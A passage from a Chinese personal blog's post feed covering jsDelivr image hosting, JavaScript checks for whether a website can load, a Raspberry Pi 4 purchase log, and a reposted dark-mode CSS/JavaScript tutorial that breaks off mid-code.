class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span 